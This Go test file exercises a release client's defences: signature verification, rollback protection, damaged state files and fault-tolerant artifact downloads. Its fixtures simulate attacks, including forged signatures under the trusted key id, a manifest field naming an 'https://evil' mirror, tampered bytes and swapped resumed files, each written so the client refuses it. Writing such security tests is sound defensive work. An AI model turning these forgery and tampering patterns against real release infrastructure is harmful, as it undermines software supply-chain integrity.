package release

import (
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/AitorConS/jerboa/internal/durable"
	"github.com/AitorConS/jerboa/internal/durable/durabletest"
	"github.com/AitorConS/jerboa/internal/httpclient"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// These tests are about a release origin, a network or a disk that
// misbehaves. The rules they hold the client to: nothing is installed unless
// the signed manifest vouches for its exact bytes, a manifest older than one
// already accepted stays refused whatever happens to the disk, and a failed
// download leaves the previously installed artifact alone.

// hangUp answers with a complete header announcing len(body) bytes, sends only
// the first n, and closes the connection: a transfer cut mid-body.
func hangUp(w http.ResponseWriter, header http.Header, body []byte, n int) {
	conn, buf, err := w.(http.Hijacker).Hijack()
	if err != nil {
		panic(err)
	}
	fmt.Fprintf(buf, "HTTP/1.1 200 OK\r\nContent-Length: %d\r\n", len(body))
	for k := range header {
		fmt.Fprintf(buf, "%s: %s\r\n", k, header.Get(k))
	}
	_, _ = buf.WriteString("\r\n")
	_, _ = buf.Write(body[:n])
	_ = buf.Flush()
	_ = conn.Close()
}

// refuse closes the connection without answering at all.
func refuse(w http.ResponseWriter) {
	conn, _, err := w.(http.Hijacker).Hijack()
	if err != nil {
		panic(err)
	}
	_ = conn.Close()
}

func sha(b []byte) string {
	sum := sha256.Sum256(b)
	return hex.EncodeToString(sum[:])
}

// dirNames lists what is in dir, to check nothing was left behind.
func dirNames(t *testing.T, dir string) []string {
	t.Helper()
	entries, err := os.ReadDir(dir)
	require.NoError(t, err)
	names := make([]string, len(entries))
	for i, e := range entries {
		names[i] = e.Name()
	}
	return names
}

// --- the freshness state file -------------------------------------------

const (
	timeOld    = "2026-10-01T10:00:00Z"
	timeSeen   = "2026-10-10T10:00:00Z"
	timeNewest = "2026-10-20T10:00:00Z"
)

// Recording a newer manifest fails at every step, every way. The manifest is
// valid and must still be returned; the state file must stay readable, and the
// rollback protection that existed before the failure must not be lost.
func TestFaults_RecordingANewerManifestFails(t *testing.T) {
	for _, f := range durabletest.Failures() {
		t.Run(f.Name, func(t *testing.T) {
			c, current := rotatingOrigin(t, newTestSigner(t))
			ctx := context.Background()
			statePath := filepath.Join(c.StateDir, stateFile)

			current.Store(stableManifest(timeSeen))
			_, err := c.FetchManifest(ctx, ChannelStable)
			require.NoError(t, err)

			current.Store(stableManifest(timeNewest))
			inj := durabletest.Inject(t, f, 0, nil)
			m, err := c.FetchManifest(ctx, ChannelStable)
			require.True(t, inj.Fired(), "the failure was never reached")
			durable.SetFault(nil)
			require.NoError(t, err, "a valid manifest was refused because the state could not be saved")
			require.Equal(t, timeNewest, m.Generated)

			seen, err := readState(statePath)
			require.NoError(t, err, "a failed save left a state file that does not parse")
			require.Len(t, seen, 1)
			for _, recorded := range seen {
				assert.Contains(t, []string{timeSeen, timeNewest}, recorded)
			}
			if !f.Crash() {
				assert.Equal(t, []string{stateFile}, dirNames(t, c.StateDir), "temporary file left behind")
			}

			// A manifest older than the one accepted before the failure is
			// still a rollback.
			current.Store(stableManifest(timeOld))
			_, err = c.FetchManifest(ctx, ChannelStable)
			require.ErrorContains(t, err, "older than one already accepted")

			// The next fetch records what this one could not.
			current.Store(stableManifest(timeNewest))
			_, err = c.FetchManifest(ctx, ChannelStable)
			require.NoError(t, err)
			current.Store(stableManifest(timeSeen))
			_, err = c.FetchManifest(ctx, ChannelStable)
			require.ErrorContains(t, err, "older than one already accepted")
		})
	}
}

// The very first record fails: there is no state yet, and the failure must not
// leave one that blocks every later fetch.
func TestFaults_RecordingTheFirstManifestFails(t *testing.T) {
	for _, f := range durabletest.Failures() {
		t.Run(f.Name, func(t *testing.T) {
			c, current := rotatingOrigin(t, newTestSigner(t))
			ctx := context.Background()

			current.Store(stableManifest(timeSeen))
			inj := durabletest.Inject(t, f, 0, nil)
			_, err := c.FetchManifest(ctx, ChannelStable)
			require.True(t, inj.Fired())
			durable.SetFault(nil)
			require.NoError(t, err)

			_, err = readState(filepath.Join(c.StateDir, stateFile))
			require.NoError(t, err)
			_, err = c.FetchManifest(ctx, ChannelStable)
			require.NoError(t, err, "the client is stuck after a failed first save")
		})
	}
}

// A state file damaged on disk must not silently reset the rollback
// protection: the fetch is refused, the error names the file, and the file is
// left as found for the user to inspect.
func TestFaults_DamagedStateFileRefusesInsteadOfResetting(t *testing.T) {
	cases := map[string][]byte{
		"empty":        {},
		"truncated":    []byte(`{"https://releases.example stable": "2026-10-`),
		"garbage":      {0xff, 0xfe, 0x00, 0x01},
		"array":        []byte(`[]`),
		"wrong-values": []byte(`{"k": 5}`),
		"nul-padded":   make([]byte, 64),
	}
	for name, content := range cases {
		t.Run(name, func(t *testing.T) {
			c, current := rotatingOrigin(t, newTestSigner(t))
			statePath := filepath.Join(c.StateDir, stateFile)
			require.NoError(t, os.WriteFile(statePath, content, 0o600))
			current.Store(stableManifest(timeNewest))

			m, err := c.FetchManifest(context.Background(), ChannelStable)
			require.Error(t, err)
			require.Nil(t, m)
			assert.Contains(t, err.Error(), statePath, "the error must say which file is damaged")

			after, rerr := os.ReadFile(statePath)
			require.NoError(t, rerr)
			assert.Equal(t, content, after, "the damaged file was overwritten")

			// Deleting it, as the error says, resets the client.
			require.NoError(t, os.Remove(statePath))
			_, err = c.FetchManifest(context.Background(), ChannelStable)
			require.NoError(t, err)
		})
	}
}

// The state path exists but cannot be read as a file.
func TestFaults_UnreadableStateRefuses(t *testing.T) {
	c, current := rotatingOrigin(t, newTestSigner(t))
	require.NoError(t, os.Mkdir(filepath.Join(c.StateDir, stateFile), 0o700))
	current.Store(stableManifest(timeNewest))
	_, err := c.FetchManifest(context.Background(), ChannelStable)
	require.Error(t, err)
}

// A recorded time that does not parse cannot be compared against. A timed
// manifest replaces it; an untimed one must not slip under it.
func TestFaults_UnparsableRecordedTime(t *testing.T) {
	c, current := rotatingOrigin(t, newTestSigner(t))
	ctx := context.Background()
	statePath := filepath.Join(c.StateDir, stateFile)
	key := c.base() + " " + ChannelStable
	require.NoError(t, writeState(statePath, map[string]string{key: "yesterday", "other origin stable": timeSeen}))

	current.Store(stableManifest(""))
	_, err := c.FetchManifest(ctx, ChannelStable)
	require.ErrorContains(t, err, "no generation time")

	current.Store(stableManifest(timeSeen))
	_, err = c.FetchManifest(ctx, ChannelStable)
	require.NoError(t, err)
	seen, err := readState(statePath)
	require.NoError(t, err)
	assert.Equal(t, timeSeen, seen[key])
	assert.Equal(t, timeSeen, seen["other origin stable"], "another origin's record was dropped")
}

func TestFaults_StateFileIsPrivate(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("POSIX modes")
	}
	c, current := rotatingOrigin(t, newTestSigner(t))
	c.StateDir = filepath.Join(c.StateDir, "nested", ".jerboa")
	for _, generated := range []string{timeSeen, timeNewest} {
		current.Store(stableManifest(generated))
		_, err := c.FetchManifest(context.Background(), ChannelStable)
		require.NoError(t, err)
	}
	info, err := os.Stat(filepath.Join(c.StateDir, stateFile))
	require.NoError(t, err)
	assert.Equal(t, os.FileMode(0o600), info.Mode().Perm())
	info, err = os.Stat(c.StateDir)
	require.NoError(t, err)
	assert.Equal(t, os.FileMode(0o700), info.Mode().Perm())
}

// Several commands fetch the manifest at once while the origin publishes. The
// state must stay readable and must never end up older than what was there
// before they started.
func TestFaults_ConcurrentFetchesKeepTheStateReadable(t *testing.T) {
	c, current := rotatingOrigin(t, newTestSigner(t))
	ctx := context.Background()
	current.Store(stableManifest(timeSeen))
	_, err := c.FetchManifest(ctx, ChannelStable)
	require.NoError(t, err)

	var wg sync.WaitGroup
	for i := range 16 {
		wg.Add(1)
		go func() {
			defer wg.Done()
			current.Store(stableManifest(fmt.Sprintf("2026-10-20T10:00:%02dZ", i)))
			// A fetch that loses the race against a newer manifest is
			// refused as a rollback; that is correct, not a failure.
			_, _ = c.FetchManifest(ctx, ChannelStable)
		}()
	}
	wg.Wait()

	seen, err := readState(filepath.Join(c.StateDir, stateFile))
	require.NoError(t, err)
	recorded, err := time.Parse(time.RFC3339, seen[c.base()+" "+ChannelStable])
	require.NoError(t, err)
	floor, err := time.Parse(time.RFC3339, timeSeen)
	require.NoError(t, err)
	assert.False(t, recorded.Before(floor), "the recorded time went backwards")
	assert.Equal(t, []string{stateFile}, dirNames(t, c.StateDir))

	current.Store(stableManifest(timeOld))
	_, err = c.FetchManifest(ctx, ChannelStable)
	require.ErrorContains(t, err, "older than one already accepted")
}

// --- the manifest fetch --------------------------------------------------

// The origin fails while serving the manifest or its signature. Every failure
// must be an error, never a manifest, and must not touch the freshness state.
func TestFaults_ManifestFetchFailures(t *testing.T) {
	s := newTestSigner(t)
	manifest := stableManifest(timeNewest)
	sig := s.sign(manifest, "timestamp:1")
	big := append(append([]byte{}, manifest...), bytes.Repeat([]byte(" "), 2<<20)...)

	failures := map[string]http.HandlerFunc{
		"401": func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusUnauthorized) },
		"403": func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusForbidden) },
		"404": func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusNotFound) },
		"429": func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusTooManyRequests) },
		"500": func(w http.ResponseWriter, _ *http.Request) { w.WriteHeader(http.StatusInternalServerError) },
		"503-body": func(w http.ResponseWriter, _ *http.Request) {
			http.Error(w, string(manifest), http.StatusServiceUnavailable)
		},
		"no-answer": func(w http.ResponseWriter, _ *http.Request) { refuse(w) },
		"empty":     func(http.ResponseWriter, *http.Request) {},
		"html": func(w http.ResponseWriter, _ *http.Request) {
			_, _ = w.Write([]byte("<html>Sign in to the hotel Wi-Fi</html>"))
		},
		"redirecting": func(w http.ResponseWriter, r *http.Request) { http.Redirect(w, r, r.URL.Path, http.StatusFound) },
	}
	for _, doc := range []string{"manifest", "signature"} {
		body := manifest
		if doc == "signature" {
			body = sig
		}
		failures["cut-mid-body"] = func(w http.ResponseWriter, _ *http.Request) { hangUp(w, nil, body, len(body)/2) }
		failures["half-the-bytes"] = func(w http.ResponseWriter, _ *http.Request) { _, _ = w.Write(body[:len(body)/2]) }
		for name, fail := range failures {
			t.Run(doc+"/"+name, func(t *testing.T) {
				srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
					isSig := strings.HasSuffix(r.URL.Path, ".minisig")
					switch {
					case isSig == (doc == "signature"):
						fail(w, r)
					case isSig:
						_, _ = w.Write(sig)
					default:
						_, _ = w.Write(manifest)
					}
				}))
				defer srv.Close()
				c, err := NewClient(srv.URL, s.publicKey())
				require.NoError(t, err)
				c.StateDir = t.TempDir()

				m, err := c.FetchManifest(context.Background(), ChannelStable)
				require.Error(t, err)
				require.Nil(t, m)
				assert.Empty(t, dirNames(t, c.StateDir), "a manifest that was never accepted was recorded")
				if doc == "manifest" && name == "404" {
					require.ErrorIs(t, err, ErrChannelNotPublished)
				}
			})
		}
	}

	// A manifest padded past the metadata limit is cut off while reading, so
	// its (valid) signature no longer matches: the client neither buffers an
	// unbounded body nor accepts a prefix of one.
	t.Run("manifest/oversized", func(t *testing.T) {
		bigSig := s.sign(big, "timestamp:1")
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			if strings.HasSuffix(r.URL.Path, ".minisig") {
				_, _ = w.Write(bigSig)
				return
			}
			_, _ = w.Write(big)
		}))
		defer srv.Close()
		c, err := NewClient(srv.URL, s.publicKey())
		require.NoError(t, err)
		_, err = c.FetchManifest(context.Background(), ChannelStable)
		require.ErrorContains(t, err, "signature verification failed")
	})
}

// The origin accepts the connection and then says nothing. The fetch must end
// with an error when the client's deadline passes instead of hanging.
func TestFaults_ManifestFetchStalls(t *testing.T) {
	s := newTestSigner(t)
	release := make(chan struct{})
	srv := httptest.NewServer(http.HandlerFunc(func(_ http.ResponseWriter, r *http.Request) {
		select {
		case <-release:
		case <-r.Context().Done():
		}
	}))
	defer srv.Close()
	defer close(release)

	c, err := NewClient(srv.URL, s.publicKey())
	require.NoError(t, err)
	c.HTTP = &http.Client{Timeout: 100 * time.Millisecond}
	_, err = c.FetchManifest(context.Background(), ChannelStable)
	require.Error(t, err)

	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	c.HTTP = nil
	_, err = c.FetchManifest(ctx, ChannelStable)
	require.ErrorIs(t, err, context.Canceled)
}

// Any single changed byte in a signed manifest must be refused, wherever it
// is: the signature covers all of it.
func TestFaults_EveryManifestByteIsCovered(t *testing.T) {
	s := newTestSigner(t)
	manifest := stableManifest(timeNewest)
	sig := s.sign(manifest, "timestamp:1")
	var served atomic.Value
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if strings.HasSuffix(r.URL.Path, ".minisig") {
			_, _ = w.Write(sig)
			return
		}
		_, _ = w.Write(served.Load().([]byte))
	}))
	defer srv.Close()
	c, err := NewClient(srv.URL, s.publicKey())
	require.NoError(t, err)

	served.Store(manifest)
	_, err = c.FetchManifest(context.Background(), ChannelStable)
	require.NoError(t, err)

	for i := range manifest {
		tampered := append([]byte{}, manifest...)
		tampered[i] ^= 0x01
		served.Store(tampered)
		_, err := c.FetchManifest(context.Background(), ChannelStable)
		require.Error(t, err, "byte %d of the manifest is not covered by the signature", i)
	}
	for _, cut := range [][]byte{manifest[:len(manifest)-1], manifest[:len(manifest)/2], append(append([]byte{}, manifest...), ' ')} {
		served.Store(cut)
		_, err := c.FetchManifest(context.Background(), ChannelStable)
		require.Error(t, err)
	}
}

// --- signatures ------------------------------------------------------------

// sigParts are the decoded pieces of a minisign signature file.
type sigParts struct {
	untrusted string
	sig       []byte // algorithm, key id, signature
	trusted   string // the whole "trusted comment: ..." line
	global    []byte
}

func splitSig(t *testing.T, file []byte) sigParts {
	t.Helper()
	lines := nonEmptyLines(string(file))
	require.Len(t, lines, 4)
	sig, err := base64.StdEncoding.DecodeString(lines[1])
	require.NoError(t, err)
	global, err := base64.StdEncoding.DecodeString(lines[3])
	require.NoError(t, err)
	return sigParts{untrusted: lines[0], sig: sig, trusted: lines[2], global: global}
}

func (p sigParts) file() []byte {
	return []byte(p.untrusted + "\n" + base64.StdEncoding.EncodeToString(p.sig) + "\n" +
		p.trusted + "\n" + base64.StdEncoding.EncodeToString(p.global) + "\n")
}

func TestFaults_SignatureFileDamage(t *testing.T) {
	s := newTestSigner(t)
	other := newTestSigner(t)
	pk, err := ParsePublicKey(s.publicKey())
	require.NoError(t, err)
	msg := []byte(`{"channel":"stable"}`)
	good := s.sign(msg, "timestamp:1")
	require.NoError(t, pk.Verify(msg, good))
	lines := nonEmptyLines(string(good))

	mutate := func(f func(p *sigParts)) []byte {
		p := splitSig(t, good)
		f(&p)
		return p.file()
	}
	cases := map[string][]byte{
		"empty":             nil,
		"one-line":          []byte(lines[0] + "\n"),
		"no-global-sig":     []byte(strings.Join(lines[:3], "\n") + "\n"),
		"half-the-file":     good[:len(good)/2],
		"sig-not-base64":    []byte(lines[0] + "\n!!!\n" + lines[2] + "\n" + lines[3] + "\n"),
		"global-not-base64": []byte(lines[0] + "\n" + lines[1] + "\n" + lines[2] + "\n!!!\n"),
		"sig-short":         mutate(func(p *sigParts) { p.sig = p.sig[:len(p.sig)-1] }),
		"sig-long":          mutate(func(p *sigParts) { p.sig = append(p.sig, 0) }),
		"global-short":      mutate(func(p *sigParts) { p.global = p.global[:len(p.global)-1] }),
		"global-long":       mutate(func(p *sigParts) { p.global = append(p.global, 0) }),
		"global-zero":       mutate(func(p *sigParts) { p.global = make([]byte, len(p.global)) }),
		"prehashed":         mutate(func(p *sigParts) { copy(p.sig, "ED") }),
		"unknown-algorithm": mutate(func(p *sigParts) { copy(p.sig, "XX") }),
		"other-key-id":      mutate(func(p *sigParts) { p.sig[2] ^= 0xff }),
		"no-trusted-prefix": mutate(func(p *sigParts) { p.trusted = "comment: timestamp:1" }),
		"trusted-edited":    mutate(func(p *sigParts) { p.trusted = "trusted comment: timestamp:2" }),
		"lines-swapped":     []byte(lines[0] + "\n" + lines[3] + "\n" + lines[2] + "\n" + lines[1] + "\n"),
		"other-message":     s.sign([]byte(`{"channel":"beta"}`), "timestamp:1"),
		"other-signer":      other.sign(msg, "timestamp:1"),
		// The attacker's signature under the trusted key's id.
		"other-signer-our-id": func() []byte {
			p := splitSig(t, other.sign(msg, "timestamp:1"))
			copy(p.sig[2:10], s.keyID[:])
			return p.file()
		}(),
		// A valid message signature whose global signature is the attacker's.
		"global-from-other-signer": func() []byte {
			p := splitSig(t, good)
			p.global = splitSig(t, other.sign(msg, "timestamp:1")).global
			return p.file()
		}(),
	}
	for name, file := range cases {
		t.Run(name, func(t *testing.T) {
			require.Error(t, pk.Verify(msg, file))
		})
	}

	// Every byte of the signature and of the global signature matters.
	p := splitSig(t, good)
	for i := range p.sig {
		q := splitSig(t, good)
		q.sig[i] ^= 0x01
		require.Error(t, pk.Verify(msg, q.file()), "signature byte %d", i)
	}
	for i := range p.global {
		q := splitSig(t, good)
		q.global[i] ^= 0x01
		require.Error(t, pk.Verify(msg, q.file()), "global signature byte %d", i)
	}

	// A file that went through a Windows editor is still the same signature.
	require.NoError(t, pk.Verify(msg, bytes.ReplaceAll(good, []byte("\n"), []byte("\r\n"))))
	// A client built without a key trusts nothing.
	require.Error(t, PublicKey{}.Verify(msg, good))
}

func TestFaults_PublicKeyDamage(t *testing.T) {
	s := newTestSigner(t)
	raw, err := base64.StdEncoding.DecodeString(s.publicKey())
	require.NoError(t, err)
	enc := base64.StdEncoding.EncodeToString

	cases := map[string]string{
		"empty":        "",
		"blank-lines":  "\n\n  \n",
		"comment-only": "untrusted comment: minisign public key\n",
		"truncated":    s.publicKey()[:20],
		"short":        enc(raw[:len(raw)-1]),
		"long":         enc(append(append([]byte{}, raw...), 0)),
		"prehashed":    enc(append([]byte("ED"), raw[2:]...)),
		"not-base64":   strings.Repeat("*", 56),
		"private-key":  enc(s.priv),
	}
	for name, key := range cases {
		t.Run(name, func(t *testing.T) {
			_, err := ParsePublicKey(key)
			require.Error(t, err)
			_, err = NewClient("https://releases.example", key)
			require.Error(t, err, "a client was built on a key that does not parse")
		})
	}
	pk, err := ParsePublicKey("untrusted comment: key\r\n" + s.publicKey() + "\r\n")
	require.NoError(t, err)
	assert.Equal(t, s.keyID, pk.keyID)
}

// A validly signed document can still be one the client must not act on.
func TestFaults_SignedButUnusableManifests(t *testing.T) {
	cases := map[string]string{
		"not-json":          `channel: stable`,
		"array":             `[]`,
		"null":              `null`,
		"no-channel":        `{"components":{"cli":{"version":"v1","url":"u","sha256":"ab"}}}`,
		"no-components":     `{"channel":"stable"}`,
		"empty-components":  `{"channel":"stable","components":{}}`,
		"unknown-field":     `{"channel":"stable","mirror":"https://evil","components":{"cli":{"version":"v1","url":"u","sha256":"ab"}}}`,
		"no-version":        `{"channel":"stable","components":{"cli":{"url":"u","sha256":"ab"}}}`,
		"no-asset":          `{"channel":"stable","components":{"cli":{"version":"v1"}}}`,
		"url-without-hash":  `{"channel":"stable","components":{"cli":{"version":"v1","url":"u"}}}`,
		"hash-without-url":  `{"channel":"stable","components":{"cli":{"version":"v1","sha256":"ab"}}}`,
		"platform-no-hash":  `{"channel":"stable","components":{"cli":{"version":"v1","platforms":{"linux-amd64":{"url":"u"}}}}}`,
		"file-no-url":       `{"channel":"stable","components":{"kernel":{"version":"v1","files":{"mkfs":{"sha256":"ab"}}}}}`,
		"size-is-a-string":  `{"channel":"stable","components":{"cli":{"version":"v1","url":"u","sha256":"ab","size":"10"}}}`,
		"components-a-list": `{"channel":"stable","components":[{"version":"v1"}]}`,
		"truncated":         `{"channel":"stable","components":{"cli":{"version":"v1","url":"u","sha2`,
	}
	for name, doc := range cases {
		t.Run(name, func(t *testing.T) {
			m, err := ParseManifest([]byte(doc))
			require.Error(t, err)
			require.Nil(t, m)

			// The same holds end to end, with a valid signature over it.
			c, current := rotatingOrigin(t, newTestSigner(t))
			current.Store([]byte(doc))
			_, err = c.FetchManifest(context.Background(), ChannelStable)
			require.Error(t, err)
			assert.Empty(t, dirNames(t, c.StateDir))
		})
	}
}

// A component the manifest does not carry for this host yields an error, and
// an asset without a hash is never downloaded.
func TestFaults_AssetWithoutAHashIsNeverFetched(t *testing.T) {
	var hits atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		hits.Add(1)
		_, _ = w.Write([]byte("unverifiable"))
	}))
	defer srv.Close()

	m, err := ParseManifest([]byte(`{"channel":"stable","components":{
		"cli":{"version":"v1","platforms":{"linux-amd64":{"url":"u","sha256":"ab"}}},
		"kernel":{"version":"v1","files":{"mkfs":{"url":"u","sha256":"ab"}}}}}`))
	require.NoError(t, err)
	cli, _ := m.Component(ComponentCLI)
	_, err = cli.Asset("plan9", "mips")
	require.ErrorContains(t, err, "plan9-mips")

	// A multi-file component has no inline asset; asking for one gives an
	// asset with no hash, which the downloader refuses outright.
	kernel, _ := m.Component(ComponentKernel)
	a, err := kernel.Asset("linux", "amd64")
	require.NoError(t, err)
	a.URL = srv.URL + "/kernel"
	dir := t.TempDir()
	err = (&Client{}).DownloadArtifact(context.Background(), a, filepath.Join(dir, "kernel"))
	require.ErrorContains(t, err, "no sha256")
	assert.Zero(t, hits.Load())
	assert.Empty(t, dirNames(t, dir))
}

// --- artifact downloads ----------------------------------------------------

func artifactBody() []byte {
	body := make([]byte, 64<<10)
	for i := range body {
		body[i] = byte(i*7 + i>>8)
	}
	return body
}

// The origin answers an artifact download wrongly. Nothing may be installed,
// nothing may be left for a later run to mistake for the artifact, and the
// copy installed earlier must still be there, byte for byte.
func TestFaults_ArtifactDownloadRefused(t *testing.T) {
	body := artifactBody()
	good := Asset{SHA256: sha(body), Size: int64(len(body))}
	status := func(code int) http.HandlerFunc {
		return func(w http.ResponseWriter, _ *http.Request) { http.Error(w, "no", code) }
	}
	cases := map[string]struct {
		handler http.HandlerFunc
		asset   Asset
		want    string
	}{
		"401":       {status(http.StatusUnauthorized), good, "HTTP 401"},
		"403":       {status(http.StatusForbidden), good, "HTTP 403"},
		"404":       {status(http.StatusNotFound), good, "HTTP 404"},
		"409":       {status(http.StatusConflict), good, "HTTP 409"},
		"429":       {status(http.StatusTooManyRequests), good, "HTTP 429"},
		"500":       {status(http.StatusInternalServerError), good, "HTTP 500"},
		"503":       {status(http.StatusServiceUnavailable), good, "HTTP 503"},
		"no-answer": {func(w http.ResponseWriter, _ *http.Request) { refuse(w) }, good, "download"},
		"redirect-loop": {func(w http.ResponseWriter, r *http.Request) {
			http.Redirect(w, r, r.URL.Path, http.StatusFound)
		}, good, "redirects"},
		"other-bytes": {func(w http.ResponseWriter, _ *http.Request) {
			other := append([]byte{}, body...)
			other[len(other)/2] ^= 0x01
			_, _ = w.Write(other)
		}, good, "sha256 mismatch"},
		"short": {func(w http.ResponseWriter, _ *http.Request) {
			_, _ = w.Write(body[:len(body)-1])
		}, good, "size mismatch"},
		"empty": {func(http.ResponseWriter, *http.Request) {}, good, "size mismatch"},
		"one-byte-too-many": {func(w http.ResponseWriter, _ *http.Request) {
			_, _ = w.Write(append(append([]byte{}, body...), 0))
		}, good, "size mismatch"},
		// The manifest gives no size, so only the hash can catch it.
		"short-size-unknown": {func(w http.ResponseWriter, _ *http.Request) {
			_, _ = w.Write(body[:len(body)/2])
		}, Asset{SHA256: sha(body)}, "sha256 mismatch"},
		"error-page": {func(w http.ResponseWriter, _ *http.Request) {
			_, _ = w.Write([]byte("<html>502 Bad Gateway</html>"))
		}, good, "mismatch"},
	}
	for name, tc := range cases {
		t.Run(name, func(t *testing.T) {
			srv := httptest.NewServer(tc.handler)
			defer srv.Close()
			dir := t.TempDir()
			dest := filepath.Join(dir, "kernel.img")
			require.NoError(t, os.WriteFile(dest, []byte("installed earlier"), 0o644))

			a := tc.asset
			a.URL = srv.URL + "/kernel.img"
			err := (&Client{}).DownloadArtifact(context.Background(), a, dest)
			require.ErrorContains(t, err, tc.want)

			assert.Equal(t, []string{"kernel.img"}, dirNames(t, dir), "a refused download left files behind")
			got, rerr := os.ReadFile(dest)
			require.NoError(t, rerr)
			assert.Equal(t, "installed earlier", string(got))
		})
	}
}

// An origin that never stops sending must not fill the disk: the stream is cut
// just past the size the signed manifest states.
func TestFaults_OversizedArtifactIsCutOff(t *testing.T) {
	body := []byte("small artifact")
	var sent atomic.Int64
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		chunk := bytes.Repeat([]byte{'x'}, 32<<10)
		for range 4096 { // 128 MiB if the client keeps reading
			if _, err := w.Write(chunk); err != nil || r.Context().Err() != nil {
				return
			}
			sent.Add(int64(len(chunk)))
		}
	}))
	defer srv.Close()

	dir := t.TempDir()
	a := Asset{URL: srv.URL + "/a", SHA256: sha(body), Size: int64(len(body))}
	err := (&Client{}).DownloadArtifact(context.Background(), a, filepath.Join(dir, "a"))
	require.ErrorContains(t, err, "size mismatch")
	assert.Contains(t, err.Error(), strconv.Itoa(len(body)+1), "more than one byte past the stated size was kept")
	assert.Empty(t, dirNames(t, dir))
	assert.Less(t, sent.Load(), int64(64<<20), "the client kept reading an endless body")
}

// The connection dies mid-body on every attempt. The download fails without
// installing anything; once the origin recovers, the next call completes and
// leaves only the artifact.
func TestFaults_ArtifactConnectionCutThenRecovers(t *testing.T) {
	body := artifactBody()
	var healthy atomic.Bool
	var requests atomic.Int32
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		requests.Add(1)
		if !healthy.Load() {
			hangUp(w, nil, body, len(body)/2)
			return
		}
		_, _ = w.Write(body)
	}))
	defer srv.Close()

	dir := t.TempDir()
	dest := filepath.Join(dir, "kernel.img")
	a := Asset{URL: srv.URL + "/kernel.img", SHA256: sha(body), Size: int64(len(body))}
	c := &Client{}

	err := c.DownloadArtifact(context.Background(), a, dest)
	require.Error(t, err)
	_, statErr := os.Stat(dest)
	require.True(t, os.IsNotExist(statErr), "a cut download was installed")
	assert.Greater(t, requests.Load(), int32(1), "a transfer that was making progress is retried")
	assert.LessOrEqual(t, requests.Load(), int32(5), "retries must be bounded")

	healthy.Store(true)
	require.NoError(t, c.DownloadArtifact(context.Background(), a, dest))
	got, err := os.ReadFile(dest)
	require.NoError(t, err)
	assert.Equal(t, body, got)
	assert.Equal(t, []string{"kernel.img"}, dirNames(t, dir))
}

// rangeOrigin serves body with an ETag and honors Range, cutting the first
// response half-way. tail, when set, replaces what a resumed request gets.
type rangeOrigin struct {
	body   []byte
	tail   func(from int) []byte
	cut    atomic.Bool
	ranges atomic.Int32
}

func (o *rangeOrigin) ServeHTTP(w http.ResponseWriter, r *http.Request) {
	etag := http.Header{"Etag": []string{`"v1"`}}
	if rg := r.Header.Get("Range"); rg != "" && r.Header.Get("If-Range") == `"v1"` {
		from, err := strconv.Atoi(strings.TrimSuffix(strings.TrimPrefix(rg, "bytes="), "-"))
		if err != nil || from > len(o.body) {
			w.WriteHeader(http.StatusRequestedRangeNotSatisfiable)
			return
		}
		o.ranges.Add(1)
		rest := o.body[from:]
		if o.tail != nil {
			rest = o.tail(from)
		}
		w.Header().Set("Content-Range", fmt.Sprintf("bytes %d-%d/%d", from, len(o.body)-1, len(o.body)))
		w.Header().Set("ETag", `"v1"`)
		w.WriteHeader(http.StatusPartialContent)
		_, _ = w.Write(rest)
		return
	}
	if o.cut.CompareAndSwap(false, true) {
		hangUp(w, etag, o.body, len(o.body)/2)
		return
	}
	w.Header().Set("ETag", `"v1"`)
	_, _ = w.Write(o.body)
}

// A transfer cut half-way is resumed, and the hash is checked over the bytes
// from both connections together.
func TestFaults_ResumedArtifactIsVerifiedAsAWhole(t *testing.T) {
	body := artifactBody()
	o := &rangeOrigin{body: body}
	srv := httptest.NewServer(o)
	defer srv.Close()

	dir := t.TempDir()
	dest := filepath.Join(dir, "kernel.img")
	a := Asset{URL: srv.URL + "/kernel.img", SHA256: sha(body), Size: int64(len(body))}
	require.NoError(t, (&Client{}).DownloadArtifact(context.Background(), a, dest))
	require.Equal(t, int32(1), o.ranges.Load(), "the download started over instead of resuming")
	got, err := os.ReadFile(dest)
	require.NoError(t, err)
	assert.Equal(t, body, got)
	assert.Equal(t, []string{"kernel.img"}, dirNames(t, dir))
}

// The origin swaps the file between the two connections but keeps its ETag,
// so the resumed half belongs to something else. The stitched result must be
// refused and thrown away, and a later download from scratch must work.
func TestFaults_ResumedArtifactFromAChangedFileIsRefused(t *testing.T) {
	body := artifactBody()
	o := &rangeOrigin{body: body}
	o.tail = func(from int) []byte { return bytes.Repeat([]byte{'!'}, len(body)-from) }
	srv := httptest.NewServer(o)
	defer srv.Close()

	dir := t.TempDir()
	dest := filepath.Join(dir, "kernel.img")
	a := Asset{URL: srv.URL + "/kernel.img", SHA256: sha(body), Size: int64(len(body))}
	err := (&Client{}).DownloadArtifact(context.Background(), a, dest)
	require.ErrorContains(t, err, "sha256 mismatch")
	assert.Empty(t, dirNames(t, dir), "half of one file joined to half of another was kept")

	o.tail = nil
	require.NoError(t, (&Client{}).DownloadArtifact(context.Background(), a, dest))
	got, err := os.ReadFile(dest)
	require.NoError(t, err)
	assert.Equal(t, body, got)
}

// What an earlier, killed run left beside the destination: partial bytes with
// or without the validator they came from, possibly damaged since.
func TestFaults_LeftoverPartialDownloads(t *testing.T) {
	body := artifactBody()
	half := body[:len(body)/2]
	damaged := append([]byte{}, half...)
	damaged[10] ^= 0xff

	cases := map[string]struct {
		partial   []byte
		validator string
		// firstErr is what the first call fails with; empty means it succeeds.
		firstErr string
